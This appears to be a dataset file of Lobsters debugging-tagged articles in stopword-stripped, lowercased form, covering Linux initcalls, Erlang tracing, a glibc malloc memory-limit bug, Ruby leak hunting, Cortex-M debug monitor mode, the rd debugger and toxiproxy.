initcallstart n initcallfinish n initcallstart n initcallfinish n initcallstart ftrace logging allows great information detect portion code whose execution take lot time implementation know initcalls let look implemented linux kernel code one part implementation initcalls includelinuxinith define pureinitcall fn defineinitcall fn define coreinitcall fn defineinitcall fn define postcoreinitcall fn defineinitcall fn define archinitcall fn defineinitcall fn define subsysinitcall fn defineinitcall fn define fsinitcall fn defineinitcall fn define rootfsinitcall fn defineinitcall fn rootfs define deviceinitcall fn defineinitcall fn define lateinitcall fn defineinitcall fn initcalls defined thanks generic defineinitcall two argument function name id way order initcalls ordering according number look closer argument value equal rootfs rootfsinitcall initcalls defined using postcoreinitcall second argument main difference initcalls id number string see rootfs different depending type initcall used note let focus postcoreinitcall rest article define postcoreinitcall fn defineinitcall fn let look definition kernel source dummy example simple function defined postcore initcall postcoreinitcall definition calling defineinitcall id defineinitcall fn id calling another defineinitcall additional argument sec initcalls equal initcall id initcall postcore initcall last parameter last defineinitcall look like code expanded version many color right let take break keep explanation part next article conclusion first blog post seen overview initcalls purpose able call function different stage kernel booting process usage simply create function call one definition initcalls depending level booting process need coreinitcall postcoreinitcall fsinitcall deviceinitcall short explanation moduleinit function difference initcalls way debug initcalls initcalldebug ftrace useful case boottime must fast possible short overview implementation kernel initcall id corresponding level implementation based defineinitcall next part go deeper implementation initcalls particularly colorful deviceinitcall macro resource
23,Lobsters,debugging,Debugging,Graceful Degradation,https://www.solipsys.co.uk/new/GracefulDegradation.html?tg14lb,graceful degradation,graceful degradation software contact comment,graceful degradation first learned graceful degradation colleague prefaced story saying good people learn mistake best people learn people mistake bit like saying aviation circle good landing one walk away excellent landing use plane digress told learned graceful degradation message clear telling mistake could learn wish people willing make mistake public software industry would certainly benefit could learn everyone mistake story go broad outline forget detail like made comfortable living programming electronic till time programmed assembly language best output could hope debugging see whether opened till difficult work simulator higher level language debugger singlesteppers help really wrote code assembler transferred machine tested see worked sometimes colleague amazing work could get contract time wanted money good worked six month year whatever wanted rest time except christmas one biggest mistake would come back haunt large department store major capital city used till ran program one sophisticated system around till would keep list item sold central computer would interrogate till turn find much sold item would keep track many remained stock would project reordering would necessary reordering automatic staff would alerted stock low item decision could made loved system buffer stock could reduced reducing store overhead making entire store responsive consumer demand except christmas see every christmas system essence would simply stop entire floor till would stop responding refusing accept purchase unpredictable length time suddenly start working apparent reason apparent rhyme nothing could except call colleague get come fix poblem really nothing could either even worked problem problem capacity till would keep list item sold asked would dump list central computer would go back patronising servicing customer requirement asked problem heaviest time year simply much download queue till would fill central computer got back would stop wait download data could restart entire floor till would grind halt waiting download data restart floor would simply stop good busiest shopping time year really good patch run christmas make till run slightly slow still occasional full stopping moment general system would limp along exhibit catastrophic failure entire floor stopping difficulty judging exactly slow make till run also made central computer contact till clever pseudorandom way meant one till stopped floor others would probably still working done well apart faster communication system could deal load placed till could notice queue full start slowing performance system whole would degrade gracefully sale would slow slightly evenly across store come match processing throughput course would better system simply faster overloaded degrading gracefully usually better option simply stopping think next time worry system capacity better halt clear backlog degrade gracefully continue serve customer comment decided longer include comment directly via disqus system instead delighted get email people wish make comment engage discussion comment integrated page appropriate number emailscomments get large handle might return semiautomated system looking increasingly unlikely
24,Lobsters,debugging,Debugging,Erlang dbg Intro,https://antranigv.am/weblog_en/posts/erlang-dbg-intro/,erlang dbg intro,erlang elixir kernel process messaging facility many elixir tcp server application tree see,one programming language changed life erlang using erlang couple year moved elixir based erlang vm one important aspect erlang vm real vm kernel process messaging facility many lately debugging huge erlang application whose architecture familiar needed find way see kind message sent received module function called returning wanted write small howto case need future okay example using elixir tcp server simple tcp server get data sends back origin first let clone repo antranigv zvartnots prj git clone http githubcomsonatigranyanelixirtcpserver okay let run server antranigv zvartnots elixirtcpserver iex mix erlangotp source hipe compiling file ex generated tcpserver app interactive elixir press ctrlc exit type h enter help iex good default tcp server listens port specified application tree okay send data antranigv zvartnots elixirtcpserver echo test nc localhost test interactive way antranigv zvartnots elixirtcpserver nc localhost first mesage first mesage good tcp server good tcp server bye antranigv zvartnots elixirtcpserver good see connection closed server get bye okay say want trace dosend function observe get return iex dbgstart ok pid iex dbgtracer ok pid iex dbgtpl tcpserver dosend returntrace ok matched nonode nohost saved iex dbgp newprocesses c ok matched nonode nohost iex call elixirtcpserver dosend port message client n okay first start dbg facility start tracing server local node use function tpl specify local call want trace end use p function start tracing call c newprocesses dosend function called see get send bye see following returned elixirtcpserver ok happening software system running production either attaching node connecting folk
25,Lobsters,debugging,Debugging,Major Bug in glibc is Killing Applications With a Memory Limit,https://thehftguy.com/2020/05/21/major-bug-in-glibc-is-killing-applications-with-a-memory-limit/,major bug glibc killing application memory limit,tl dr bug glibc malloc mainly affect bit multithreading application special mention java application jvm seems always trigger worst case write quite long skip third section glibc malloc want ending introduction tracked pair dev production host part larger cluster ten host careful checking absent job running working well reassuring however ghost today lack better word possible let investigate host figure wrong particular let try restart done data disappear minute double checking process victory know sure something broken repro repro critical ingredient resolution tricky bug changed working software stop working due change configuration environment changed recently one change happening firmwide recent week may related firm deprecating bit literally everything bit year python must die year bit must die one challenge transitioning bit bit application memory leak combined lack memory limit solution almost trivial set memory limit default let say gb sure enough planned depreciation bit came along default memory limit every process host fit criterion early staging must received update quick check yes deployed process get memory limit odds killed reaching memory limit one problem though way job approach anywhere near gb memory java application jvm preallocates memory startup configured use exactly mb heap glibc malloc extra memory come malloc preallocates large chunk memory per thread meant performance optimization reduce memory contention highly threaded application bit runtime preallocate mb core bit runtime preallocate mb core mean preallocation gb ram process allocated memory count toward memory limit nasty bug preallocation glibc malloc memory limit rlimit application low rlimit ten gigabyte le risk hit bug terminated mitigate preallocation behavior adjusted environment variable heroku hadoop yarn edit todoenhancingmalloc like,story debugging case happy ending tl dr bug glibc malloc mainly affect bit multithreading application special mention java application jvm seems always trigger worst case write quite long skip third section glibc malloc want ending introduction developer reported issue one service asked help investigate sure digging service log noticed log handful instance barely noticeable percent normal activity go accounted tracked pair dev production host part larger cluster ten host come service running worrying failure notification alert issue reported user bank fairly critical fail missing extent knowledge failed twice recent year first time due bug happening rare circumstance one region second time due complete sudden loss datacenter case took significant amount time understand root cause almost one hour conclude certainty datacenter exploded mostly nonevent failover kicked within second rerouting activity side world long anybody could realize anything happened anything disaster recovery peak odds looking soontobe third issue except time catching early noticed gathering another coworker back serious debugging careful checking absent job running working well reassuring however ghost today lack better word trace activity debug log possible let investigate host figure wrong particular take long realize host missing piece around loggingmonitoring one easier bit investigate might one logstash agent running affected machine configuration look good run configuration check pass starting log yesterday must worked point let try restart done odd running fine back filling data missing would dead first place data disappear minute double checking process restart paying attention start dy one minute later repeat one time victory know sure something broken repro repro critical ingredient resolution tricky bug changed meaningful error indicating configuration issue application issue jvm issue let restart keeping close look memory consumption going multiple gigabyte die working software stop working due change configuration environment changed recently context firm mono repo thousand developer hundred thousand job deployed every day almost exclusively python shop one change happening firmwide recent week may related firm deprecating bit literally everything bit year python must die year bit must die make perfect sense server operating system bit two decade desktop one many application database middleware run bit require gb memory major library dropping bit support one challenge transitioning bit bit application memory leak combined lack memory limit bit world leaky application consume memory approaching gb memory limit adressable bit crash bit world leaky application consume memory limit exhausting resource host crashing task major recurring source issue deploying application solution almost trivial set memory limit default let say gb available bit large margin extra overheard sure enough planned depreciation bit came along default memory limit every process well announced staged gradually course couple service blew immediately fixed setting memory limit gb whatever high number urgency call accuracy back dying service common host fit criterion early staging must received update quick check yes deployed process get memory limit restart failing process monitor carefully work fine one minute memory increasing dy odds killed reaching memory limit one problem though way job approach anywhere near gb memory java application jvm preallocates memory startup configured use exactly mb heap glibc malloc extra memory come long story short due bug malloc well bug feature malloc preallocates large chunk memory per thread meant performance optimization reduce memory contention highly threaded application bit runtime preallocate mb coresin bit runtime preallocate mb core typical physical server dual xeon cpu terabyte ram core count easily core cpu hyper threading mean preallocation gb ram process much exactly depends application rule thumb requires multithreaded application reason jvm always seem trigger worst case asked belt prepared one thousand case allocated memory count toward memory limit process fails dying one minute allocatingdeallocating memory different thread triggering preallocation side effect reach limit get terminated nasty bug preallocation glibc malloc memory limit rlimit application low rlimit ten gigabyte le risk hit bug terminated mitigate preallocation behavior adjusted environment variable deployment system set memory limit must set variable major scheduler cloud hosting mitigation outofthebox see heroku hadoop yarn value disable likely reduce performance percent recommended interestingly enough supposed performance optimization benchmark internet show net degradation performance value go digit around higher default hundred seems whack arena core edit found write issue referenced glibc wiki page todoenhancingmalloc throttle number arena based process rlimit process startup andor everytime rlimitas modified like like loading
26,Lobsters,debugging,Debugging,Effective Debugging of Memory Leaks in Ruby,https://stratus3d.com/blog/2020/08/11/effective-debugging-of-memory-leaks-in-ruby,effective debugging memory leak ruby,check unused gem gemfile remove check issue tracker gem still present gemfile report memory leak run rubocop rubocopperformance extension visually review ruby code possible memory leak pretty easy still found issue use ruby class find leak,list step assumes determined memory leak ruby application know causing first instinct might reach memory profiling tool begin looking memory allocation time step might seem like waste time practice found effective use time often overlook simple thing first two step focus gem often time thirdparty code widely used pitfall memory leak widely known check unused gem gemfile remove numerous tool help find memory leak ruby application large codebase even best tool still produce lot noise find even one unused gem greatly reduce amount code need analyze find memory leak seldom found least one two unused gem reviewing gemfile legacy ruby application removing unused gem sometimes added benefit reducing overall memory usage check issue tracker gem still present gemfile report memory leak gem may contain memory leak already reported gem issue tracker mailing list find ticket thread describes something similar leak experiencing may found memory leak newer version gem contains fix memory leak upgrade latest version found ticket fix available may work maintainer gem get fixed fork project fix find someone issue tracker describing issue changelogs show released version gem contain fix memory leak even leak seem like one experiencing best upgrade version known leak find source leak continue step run rubocop rubocopperformance extension likely find cause memory leak alert general performance issue may give clue leak rubocop performance warning correct code see memory leak still present memory leak likely still present continue step visually review ruby code possible memory leak read application code look class attribute grow size array grow never shrink long lived object creating memory leak pretty easy fix obvious issue spend ton time read code quickly look obvious issue application large codebases may need skip step time consuming found cause leak continue step still found issue use ruby objectspace class find leak thing get little involved follow step section profile memory usage
27,Lobsters,debugging,Debugging,Step-through debugging with no debugger on Cortex-M,https://interrupt.memfault.com/blog/cortex-m-debug-monitor,stepthrough debugging debugger cortexm,subscribe table content basic terminology halting debug debug port article itm dwt etm debug monitor mode example project setup built previous post example app built explore breakpoints work enabling debugmonitor exception debug halting control status register dhcsr tip disabling halting debug gdb debug exception monitor control register demcr halting debug debugmonitor exception configuration nuance post arm cortexm exception handling c code enable debugmonitor exception minimal debugmonitor handler post fault handling debug fault status register dfsr halting debug example c code debugmonhandler triggering breakpoint programmatically installing breakpoints fpb fpb check breakpoints even work post adding cli debugmonitor exception c code addition debugmonitor cli debug monitor continue step support c code addition debugmonitor breakpoint singlestep handling single stepping running system application final thought github reference,debugging mcu requires attaching debugger via jtag halting core many situation debug strategy feasible production unit jtag disabled system halting core cause subsystem trying debug fault ie asserts softdevice halting breakpoint remote system uart network interface exposed fortunately arm cortexm u covered week explore debug running system arm cortexm debugmonitor exception handler cover configure mcu operate mode walk example installing breakpoints singlestepping running device opinion debugmonitor handling underutilized feature applied creatively variety debug use case hope end article convince well like interrupt subscribe get latest post straight mailbox table content basic terminology arm cortexm support several level debug halting debug typical configuration use debugger like gdb mode core halted debugging mode requires access debug port via jtag swd walked overview arm debug interface work article tracing via itm dwt etm peripheral let stream instruction execution data access system running tool lauterbach segger jtrace decode stream present result gui desktop debug monitor mode enables debug running system via debugmonitor exception handler helpful scenario halting core cause timing sensitive subsystem fail use case connecting debugger feasible worth noting debug monitor support available architecture however implemented cortexm architecture example project setup following section explore set debug monitor mode simple baremetal application running using following tooling arm development board segger jlinkgdbserver gdbserver gcc gnu arm embedded toolchain compiler gnu make build system simple cli shell built previous post pyserial minitermpy connect serial console article extend upon example app built explore breakpoints work enabling debugmonitor exception debug monitor mode based debugging work triggering exception known debugmonitor exception debug event take place explore configure handler following section debug halting control status register dhcsr monitor mode debug work halting debug disabled notably cdebugen setting must cleared bit set via jtagswd connection reset full poweronreset por occurs debugger clear bit exit trying use monitor mode debug recommend adding check boot otherwise bound confuse trying test feature debugger connected via jtagswd bool debugmonitorenable void volatile dhcsr dhcsr examplelog halting debug enabled ca nt enable monitor mode debug return code set debug monitor mode tip disabling halting debug gdb using gdb halting mode debug disabled manually clearing cdebugen setting appropriate value dbgkey gdb set also useful way keep active gdb session open probe state system running debug exception monitor control register demcr core configuration debugmonitor exception controlled upper bit demcr register monen control whether debugmonitor exception enabled enabled debug event cause exception fire monpend used trigger debugmonitor exception irrespective whether monen set monreq used mcu software use bit convey state monitor mode monstep toggled debugmonitor exception enable hardware singlestepping set upon return exception handler core execute single instruction return debugmonitor exception note lower bit vcharderr etc control whether debug trap occurs automatically various type exception take place take effect using halting debug mode allow guarantee system halted time exception path hit useful trying debug debugmonitor exception configuration nuance debugmonitor exception triggered debug event group priority exception greater current execution priority useful feature guarantee certain high priority operation ie bluetooth radio scheduling continue run step code part system important consequence however mean interrupt running priority debugmonitor exception debuggable using debug monitor support configuring debugmonitor exception priority require updating detail found post arm cortexm exception handling c code enable debugmonitor exception simplicity example app set debugmonitor exception lowest configurable interrupt priority mean interrupt able run debugging code running interrupt putting together bool debugmonitorenable void volatile dhcsr dhcsr examplelog halting debug enabled ca nt enable monitor mode debug return false volatile demcr const monenbit demcr monenbit priority debugmonitor exception bit use lowest priority isrs fire debugmonitor interrupt volatile examplelog monitor mode debug enabled return true minimal debugmonitor handler use handler put together post fault handling dump register state code caused debugmonitor exception invoked typedef struct attribute packed contextstateframe lr returnaddress xpsr scontextstateframe void debugmonitorhandlerc scontextstateframe frame debugmonitor exception logic attribute naked void debugmonhandler void asm volatile tst lr n ite eq n mrseq msp n mrsne psp n b debugmonitorhandlerc n debug fault status register dfsr debugmonitor exception fire dfsr inspected information debug event took place event possible using halting debug debugmonitor state interest dwttrap indicates debug event generated due configuration dwt bkpt indicates one breakpoint event took place either via fpb bkpt instruction halted indicates core halted due monstep request note dfsr bit sticky write value clear example c code debugmonhandler let extend debugmonitorhandlerc dump state collecting void debugmonitorhandlerc scontextstateframe frame volatile demcr volatile dfsr const dfsrdwtevtbitmask const dfsrbkptevtbitmask const dfsrhaltevtbitmask const bool isdwtdbgevt dfsr dfsrdwtevtbitmask const bool isbkptdbgevt dfsr dfsrbkptevtbitmask const bool ishaltdbgevt dfsr dfsrhaltevtbitmask examplelog debugmonitor exception examplelog demcr demcr examplelog dfsr bkpt halt dwt dfsr int isbkptdbgevt int ishaltdbgevt int isdwtdbgevt examplelog register dump examplelog frame examplelog frame examplelog frame examplelog frame examplelog frame examplelog lr frame lr examplelog pc frame returnaddress examplelog frame xpsr triggering breakpoint test thing create super simple cli command issue breakpoint instruction static int prvissuebreakpoint int argc char argv asm bkpt return one terminal need start gdbserver jlinkgdbserver swd device nogui need compile example application flash cd interruptrepo exampledebugmon make compiling srcdebugmonitorexceptionc linking library generated armnoneeabigdbpy evalcommand target remote ex mon reset ex load ex mon reset gdb gdb disable halting debug program continue running gdb set final terminal open serial connection using miniterm minitermpy raw available port jlink enter port index full name miniterm quit ctrl menu ctrlt help ctrlt followed ctrlh shell debugmonen monitor mode debug enabled shell bkpt debugmonitor exception demcr dfsr register dump lr pc expected see bit dfsr set indicating breakpoint debug event generated use gdb inspect instruction located confirm indeed breakpoint instruction gdb xi prvissuebreakpoint bkpt also dump instruction confirm match bkpt instruction encoding gdb px programmatically installing breakpoints fpb fpb program one thefpcomp register hold address would like break layout fpcomp register little odd basically given instraddr fpcomp map instraddr fpcomp map instraddr lowest bit fpcomp control whether breakpoint enabled transcribe logic code follows bool fpbsetbreakpoint sizet compid instraddr instraddr revision breakpoints code installed return false make sure fpb enabled fpb fpctrl const replace instraddr const fpcomp instraddr replace fpb fpcomp compid fpcomp return true detail configure flash patch breakpoint fpb unit check breakpoints even work post facilitate breakpoint testing added program function print name function executed void void examplelog stub function called func calling function test debug monitor mode implementation also added cli command shell help u configure debugmonitor exception handler enable breakpoints call dummy function shell help bkpt issue breakpoint instruction debugmonen enable monitor debug mode fpbdump dump active fpb setting fpbsetbreakpoint set breakpoint comp id address calldummyfuncs invoke dummy function dumpdummyfuncs print first instruction dummy function help list command let try configuring breakpoint address see happens shell dumpdummyfuncs start first instruction shell debugmonen monitor mode debug enabled shell fpbsetbreakpoint set breakpoint address fpcomp succeeded shell fpbdump fpb revision enabled hardware breakpoints fpcomp enabled replace address shell calldummyfuncs stub function called stub function called stub function called debugmonitor exception demcr dfsr register dump lr pc expected see debugmonhandler invoked address pc installed breakpoint adding cli debugmonitor exception add cli debugmonitor handling need way read byte uart isr done either polling peripheral using interrupt configured run higher priority debugmonitor exception reading example app add two command c continue debugmonitor exception fire step one instruction return debugmonitor exception c code addition debugmonitor cli typedef enum kdebugstatenone kdebugstatesinglestep edebugstate static edebugstate suserrequesteddebugstate kdebugstatenone void debugmonitorhandlerc scontextstateframe frame logic dump info isdwtdbgevt isbkptdbgevt suserrequesteddebugstate kdebugstatesinglestep examplelog debug event detected awaiting c char c shellportgetchar c continue examplelog got char c n c c c suserrequesteddebugstate kdebugstatenone break else c suserrequesteddebugstate kdebugstatesinglestep break else examplelog resuming logic debug monitor continue step support stepping breakpoint several step process bkpt instruction need advance program counter size instruction byte bkpt event generated breakpoint configured fpb need disable fpb otherwise attempt continue hit breakpoint singlestep one instruction reenable fpb disable singlestepping order resume program execution debugmonhandler inspect pc frame parameter passed debugmonitorhandlerc figure whether debug event caused executing breakpoint instruction disableenable fpb clearing setting enable bit fpb fpctrl register enabledisable singlestep functionality setting clearing monstep bit demcr c code addition debugmonitor breakpoint singlestep handling let implement logic described code const demcrsinglestepmask isbkptdbgevt const instruction frame returnaddress instruction advance past breakpoint instruction frame returnaddress sizeof instruction else fpb generated breakpoint need disable fpb singlestep fpbdisable examplelog singlestepping fpb x frame returnaddress singlestep next instruction cause debugmonitor interrupt fire return exception single instruction executed halted bit set dfsr happens demcr demcrsinglestepmask serviced breakpoint event clear mask dfsr dfsrbkptevtbitmask else ishaltdbgevt reenable fpb case got via singlestep bkpt debug event fpbenable sdebugstate kdebugstatesinglestep demcr demcrsinglestepmask serviced single step event clear mask dfsr dfsrhaltevtbitmask single stepping running system test singlestep feature use disassemble gdb determine expect see thing working gdb disa dump assembler code function ldr pc ldr pc bw examplelog strb movs strb movs end assembler dump install breakpoint address single step shold see branch executed processor shell debugmonen monitor mode debug enabled shell fpbsetbreakpoint shell calldummyfuncs stub function called stub function called stub function called debugmonitor exception demcr dfsr register dump lr pc debug event detected awaiting c type got char pc debug event detected awaiting c type got char pc debug event detected awaiting c type got char pc debug event detected awaiting c resume flow c see rest function get called got char c stub function called stub function called stub function called stub function called stub function called stub function called stub function dummyfunctionram called nice work point make debugmonitor cli interface useful could extend shell dump content stack memory region application couple project online today make use debug monitor functionality notably segger ship sdk compile project enable monitor mode debug support segger tool quite article make use series let set breakpoints application code without triggering asserts soft device code run higher priority interrupt monitor remote inspection project github expose debugmonitor port implement gdb remote serial protocol compiled project connect gdb directly board via uart connection lot additional use case may want include implementation system well favorite include exposing debug interface third party developer embedded platform debugging sealed unit uart network interface exposed debugging power consumption issue maintaining swdjtag connection would ruin attempt monitor quiescent current debug interface consumes lot power final thought hope article taught little bit arm debug monitor mode handling got thinking creative way feature leveraged used monitor mode debugging project worked love hear used discussion area see anything like change submit pull request open issue github reference
28,Lobsters,debugging,Debugging,rd is a record/replay debugger written in rust,https://github.com/sidkshatriya/rd,rd recordreplay debugger written rust,record debug tool mozillarr installing running credit mozillarr background mozillarr contribution work mozillarr tip suggestion add alias logging recording trace rrtrace environment variable,rd record debug tool rd rust language port mozillarr debugger port progress many thing work already see installing rd requires nightly version rust toolchain compile git clone git githubcom sidkshatriyardgit cd rd cargo install locked force path alternatively use debug like thing run much slowly code compiled lower compiler optimization extra debugmode assertion etc cargo install debug locked force path general run release mode debug mode much slower run rd debug mode run issue working developing rd program tested compile run properly ubuntu installation moment please file ticket rd work properly specific linux distribution general rr compiles run properly linux distro rd running rd invoking rd without parameter give help get help specific rd subcommand rd rerun help credit rd project would possible without work done mozillarr project many humanyears development effort gone making rr truly amazing piece software rd project grateful contributor mozillarr project background rd work principle rr please see mozillarr find information specifically excellent technical overview rr found contribution contribution record debug tool rd welcome encouraged contributing rd agree license contribution mit license without term condition work port currently progress ready enduser usage however developer interested contributing project find lot work build upon project already contains line ported rust code port currently capable replaying trace recorded previously mozillarr rd yet capable recording trace come future port progress following work rd rerun rd replay mean interactive replay us debugger like gdb yet supported rd buildid rd cpufeatures rd dump rd traceinfo tip suggestion add alias installing rd add alias like bash shell assuming local source build mozillarr homeabcxyzrrbuild alias rd rd resourcepathhomeabcxyzrrbuild avoid constantly specifying resource path every rd invocation logging various logging level debug info warn info fatal log warn default debug message autoremotesyscalls rust module example rdlogall warn autoremotesyscalls debug rd etc params recording trace rd record trace point time however process trace previously recorded rr make sure trace recorded n flag disabled syscallbuf rd support syscallbuf recording future rr record n program recorded rrtrace environment variable rd understands rrtrace environment variable eg rrtracethetracedirectory rd replay
29,Lobsters,debugging,Debugging,AURORA: Statistical Crash Analysis for Automated Root Cause Explanation | USENIX,https://www.usenix.org/conference/usenixsecurity20/presentation/blazytko,aurora statistical crash analysis automated root cause explanation usenix,support usenix,open access mediausenix committed open access research presented event paper proceeding freely available everyone event begin video audio andor slide posted event also free open everyone support usenix commitment open access bibtex inproceedings author tim blazytko moritz schl gel cornelius aschermann ali abbasi joel frank simon w rner thorsten holz title aurora statistical crash analysis automated root cause explanation booktitle usenix security symposium usenix security year isbn page url http publisher usenix association month aug
30,Lobsters,debugging,Debugging,"probe.rs: a modern, embedded debugging toolkit, written in Rust",http://probe.rs/,probers modern embedded debugging toolkit written rust,compatible,compatible arm riscv cmsisdap stlink jlink probers support many come
31,Lobsters,debugging,Debugging,Shopify/toxiproxy -- framework for simulating network conditions,https://github.com/Shopify/toxiproxy,shopifytoxiproxy framework simulating network condition,toxiproxy toxiproxy tool need prove test application nt single point failure blog post usage ruby client client table content yet another chaotic tcp proxy client example usage installing upgrading populating using toxics latency bandwidth slow close timeout slicer http api proxy field toxic field endpoint populating proxy cli example faq development yet another chaotic tcp proxy client example sirupsentoxiproxyrailsexample usage redis set sirupsentoxiproxyrailsexample usage installing toxiproxy linux ubuntu o x window http docker docker hub source upgrading toxiproxy changelogmd populating toxiproxy listen using toxiproxy toxics http api creatingtoxicsmd latency bandwidth slowclose timeout slicer limitdata http api proxy field toxic field toxics endpoint get proxy post proxy post populate get proxy proxy post proxy proxy delete proxy proxy get proxy proxy toxics post proxy proxy toxics get proxy proxy toxics toxic post proxy proxy toxics toxic delete proxy proxy toxics toxic post reset get version populating proxy cli example frequently asked question fast toxiproxy toxiproxy randomized testing seeing toxiproxy action reflected mysql toxiproxy cause intermittent connection failure run toxiproxy application development release github draft release bump version homebrew,toxiproxy toxiproxy framework simulating network condition made specifically work testing ci development environment supporting deterministic tampering connection support randomized chaos customization toxiproxy tool need prove test application nt single point failure successfully using development test environment shopify since october see blog post resiliency information toxiproxy usage consists two part tcp proxy written go repository contains client communicating proxy http configure application make test connection go toxiproxy manipulate health via http see usage set project example add latency response mysql ruby client toxiproxy mysqlmaster downstream latency latency apply shopfirst take least end take redis instance toxiproxy redis shopfirst throw exception end example readme currently ruby nothing stopping creating client language see client table content yet another chaotic tcp proxy client example usage installing upgrading populating using toxics latency bandwidth slow close timeout slicer http api proxy field toxic field endpoint populating proxy cli example faq development yet another chaotic tcp proxy existing one found nt provide kind dynamic api needed integration unit testing linux tool like nc crossplatform require root make problematic test development ci environment client example let walk example rail application note toxiproxy way tied ruby first use case see full example sirupsentoxiproxyrailsexample get started right away jump usage popular blog reason storing tag post redis post mysql might post class includes method manipulate tag redis set class post activerecord base return array tag def tag tagredissmembers tagkey end add tag post def addtag tag tagredissadd tagkey tag end remove tag post def removetag tag tagredissrem tagkey tag end return key redis set tag post def tagkey post tag selfid end end decided erroring writing tag data store addingremoving ok however tag data store able see post tag could simply rescue redis cannotconnecterror around smembers redis call tag method let use toxiproxy test since already installed toxiproxy running machine skip step need make sure toxiproxy mapping redis tag configbootrb connection made add require toxiproxy toxiproxypopulate name toxiproxytestredistags listen upstream configenvironmentstestrb set tagredis redis client connects redis toxiproxy adding line tagredis redisnew port call test environment go toxiproxy mean add unit test simulate failure test return empty array tag redis listing tag postaddtag mammal take redises toxiproxy toxiproxy redis assertequal posttags end end test fails redis cannotconnecterror perfect toxiproxy took redis successfully duration closure let fix tag method resilient def tag tagredissmembers tagkey rescue redis cannotconnecterror end test pas unit test prof fetching tag redis return empty array instead throwing exception full coverage also write integration test wrap fetching entire blog post page redis full example application sirupsentoxiproxyrailsexample usage configuring project use toxiproxy consists three step installing toxiproxy populating toxiproxy using toxiproxy installing toxiproxy linux see release latest binary system package architecture ubuntu wget http sudo dpkg sudo service toxiproxy start o x brew tap shopifyshopify brew install toxiproxy window toxiproxy window available download http docker toxiproxy available docker hub docker pull shopifytoxiproxy docker run shopifytoxiproxy using toxiproxy host rather container enable host networking nethost source go installed build toxiproxy source using make file make build toxiproxyserver upgrading toxiproxy toxiproxy several change made api make incompatible version order use version toxiproxy server need make sure client library support version check version toxiproxy running looking version endpoint see documentation client library specific library change detailed change toxiproxy server found changelogmd populating toxiproxy application boot need make sure toxiproxy know endpoint proxy main parameter name address toxiproxy listen address upstream client library helper task essentially making sure proxy list created example ruby client make sure shopifytestredismaster shopifytestmysqlmaster present toxiproxy toxiproxypopulate name shopifytestredismaster listen upstream name shopifytestmysqlmaster listen upstream code need run early boot possible code establishes connection toxiproxy please check client library documentation population helper alternatively use cli create proxy eg toxiproxycli create shopifytestredismaster l u recommend naming app env data store shard make sure clash application using toxiproxy large application recommend storing toxiproxy configuration separate configuration file use configtoxiproxyjson file passed server using config option loaded application use populate function example configtoxiproxyjson name listen upstream enabled true name listen upstream enabled true use port outside ephemeral port range avoid random port conflict linux default see using toxiproxy use toxiproxy need configure application connect toxiproxy continuing example step two configure redis client connect toxiproxy old straight redis redis redisnew port new toxiproxy redis redisnew port tamper toxiproxy api ruby redis redisnew port toxiproxy shopifytestredismaster downstream latency latency apply redisget test take end via cli toxiproxycli toxic add shopifytestredismaster latency please consult respective client library usage toxics toxics manipulate pipe client upstream added removed proxy using http api toxic parameter change affect proxy link documentation implementing custom toxics see creatingtoxicsmd latency add delay data going proxy delay equal latency jitter attribute latency time millisecond jitter time millisecond bringing service technically toxic implementation toxiproxy done posting proxy proxy setting enabled field false bandwidth limit connection maximum number kilobyte per second attribute slowclose delay tcp socket closing delay elapsed attribute delay time millisecond timeout stop data getting close connection timeout timeout connection wo nt close data delayed toxic removed attribute timeout time millisecond slicer slice tcp data small bit optionally adding delay sliced packet attribute averagesize size byte average packet sizevariation variation byte average packet smaller averagesize delay time microsecond delay packet limitdata close connection transmitted data exceeded limit byte number byte transmit connection closed http api communication toxiproxy daemon client happens http interface described toxiproxy listens http port proxy field name proxy name string listen listen address string upstream proxy upstream address string enabled truefalse default true creation change proxy name must deleted recreated changing listen upstream field restart proxy drop active connection listen specified port toxiproxy pick ephemeral port listen field response updated actual port change enabled false take proxy switch back true reenable toxic field name toxic name string default type stream type toxic type string stream link direction affect default downstream toxicity probability toxic applied link default attribute map toxicspecific attribute see toxics toxicspecific attribute stream direction must either upstream downstream upstream applies toxic client server connection downstream applies toxic server client connection used modify request response separately endpoint endpoint json get proxy list existing proxy toxics post proxy create new proxy post populate create replace list proxy get proxy proxy show proxy active toxics post proxy proxy update proxy field delete proxy proxy delete existing proxy get proxy proxy toxics list active toxics post proxy proxy toxics create new toxic get proxy proxy toxics toxic get active toxic field post proxy proxy toxics toxic update active toxic delete proxy proxy toxics toxic remove active toxic post reset enable proxy remove active toxics get version return server version number populating proxy proxy added configured bulk using populate endpoint done passing json array proxy toxiproxy proxy name already exists compared new proxy replaced upstream listen address nt match populate call included example application start ensure required proxy exist safe make call several time since proxy untouched long field consistent new data cli example toxiproxycli create redis l u created new proxy redis toxiproxycli list listen upstream name enabled toxics redis true none hint inspect toxics toxiproxyclient inspect proxyname rediscli p set omg panda ok get omg panda toxiproxycli toxic add redis latency added downstream latency toxic latencydownstream proxy redis rediscli p get omg panda del omg integer toxiproxycli toxic remove redis n latencydownstream removed toxic latencydownstream proxy redis rediscli p get omg nil toxiproxycli delete redis deleted proxy redis rediscli p could connect redis connection refused frequently asked question fast toxiproxy speed toxiproxy depends largely hardware expect latency toxics enabled running macbook pro achieved throughput high higher end desktop basically expect toxiproxy move data around least fast app testing toxiproxy randomized testing many available toxics configured randomness jitter latency toxic also global toxicity parameter specifies percentage connection toxic affect useful thing like timeout toxic would allow x connection timeout seeing toxiproxy action reflected mysql mysql prefer local unix domain socket client matter port pas host set localhost configure mysql server create socket use host remember remove old socket restart server toxiproxy cause intermittent connection failure use port outside ephemeral port range avoid random port conflict linux default see run toxiproxy application recommend using toxiproxy application distinguish service recommend naming proxy scheme app env data store shard example shopifytestredismaster development make build toxiproxy development binary current platform make build toxiproxy binary package platform requires go compiled cross compilation enabled linux darwin well fpm path build debian package make test run toxiproxy test make darwin build binary darwin make linux build binary linux make window build binary window release ensure release run internally shopifyshopify least day best fuzzy test robustness update changelogmd bump version change version readmemd commit tag make release create binary package push new docker image create github draft release new tag upload binary debian package bump version homebrew
